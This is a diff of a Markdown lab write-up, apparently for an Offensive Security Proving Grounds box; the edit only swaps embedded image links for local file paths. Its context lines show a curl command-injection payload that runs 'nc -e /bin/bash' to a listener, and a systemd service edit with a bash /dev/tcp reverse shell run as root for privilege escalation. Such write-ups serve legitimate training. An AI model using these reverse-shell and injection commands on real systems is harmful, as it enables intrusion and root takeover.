@@ -390,7 +390,7 @@ curl -X POST --data "code=os.system('nc -e /bin/bash 192.168.45.161 18000')" htt
 
 - We type "cat /etc/systemd/system/pythonapp.service" which shows the following.
 
-![[Pasted image 20240418160552.png]]
+/home/parallels/Documents/Offensive-Security-Proving-Grounds-Boxes-Sync/Pasted Images/Pasted image 20240418160552.png
 
 - We type "vi /etc/systemd/system/pythonapp.service"
 
@@ -399,13 +399,13 @@ curl -X POST --data "code=os.system('nc -e /bin/bash 192.168.45.161 18000')" htt
 ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.161/50000 0>&1'
 User=root
   
-![[Pasted image 20240418181341.png]]
+/home/parallels/Documents/Offensive-Security-Proving-Grounds-Boxes-Sync/Pasted Images/Pasted image 20240418181341.png
 
 - We type "sudo /sbin/reboot" to reboot the system since "services" need to be restarted in order for any modifications we made to the service app to take effect.
 
 - Next, we obtain a root shell after setting up a listener on port 50000.
 
-![[Pasted image 20240418182524.png]]
+/home/parallels/Documents/Offensive-Security-Proving-Grounds-Boxes-Sync/Pasted Images/Pasted image 20240418182524.png
 
 ---
 
